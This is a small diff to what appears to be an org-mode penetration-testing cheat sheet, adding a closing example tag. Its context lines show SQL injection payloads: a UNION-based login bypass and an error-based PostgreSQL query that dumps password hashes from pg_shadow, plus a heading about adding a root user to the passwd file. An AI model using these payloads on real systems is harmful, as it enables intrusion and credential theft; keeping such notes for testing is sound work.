@@ -813,6 +813,7 @@ username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password
     PostgreSQL dumping password in error-based SQLi
     #+begin_example
 ' UNION SELECT null,CAST(passwd AS INT),null,null,null,null from pg_shadow --
+    #+end_example
     
 ** Linux
    Add root user to passwd file (root2:w00t)
